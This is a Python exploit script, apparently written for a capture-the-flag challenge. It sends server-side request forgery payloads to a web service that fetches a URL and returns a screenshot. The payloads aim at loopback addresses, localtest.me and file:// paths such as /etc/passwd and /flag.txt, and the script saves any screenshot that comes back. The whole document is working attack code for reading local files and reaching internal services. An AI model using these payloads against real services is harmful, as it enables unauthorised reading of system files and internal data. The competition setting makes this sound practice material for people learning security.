import requests
import re
import base64
import hashlib

URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/analizo"

TESTS = [
    "http://127.0.0.1/flag",
    "http://127.0.0.1/flag.txt",
    "file:///flag.txt",
    "file:///etc/passwd",
    "http://localtest.me/flag" # Resolves to 127.0.0.1/flag
]

def check(py):
    print(f"Testing {py}...")
    try:
        r = requests.post(URL, data={"url": py, "submit": "Analizo"}, timeout=10)
        print(f"Status: {r.status_code}, Len: {len(r.content)}")
        
        # Check if there is an image
        match = re.search(r'src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64 = match.group(1)
            raw = base64.b64decode(b64)
            h = hashlib.md5(raw).hexdigest()
            fn = f"debug_{h[:6]}.png"
            with open(fn, "wb") as f:
                f.write(raw)
            print(f"[+] Saved screenshot to {fn}")
        else:
            print("[-] No screenshot found.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

print("Starting Debug...")
for t in TESTS:
    check(t)
